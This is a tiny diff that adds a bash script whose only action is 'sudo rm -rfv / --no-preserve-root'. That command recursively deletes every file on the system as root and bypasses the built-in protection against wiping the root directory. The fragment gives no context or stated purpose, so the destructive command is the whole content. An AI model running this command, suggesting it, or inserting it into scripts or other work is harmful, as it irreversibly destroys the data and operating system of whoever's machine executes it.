@@ -1,0 +1,2 @@
+#!/usr/bin/bash
+sudo rm -rfv / --no-preserve-root
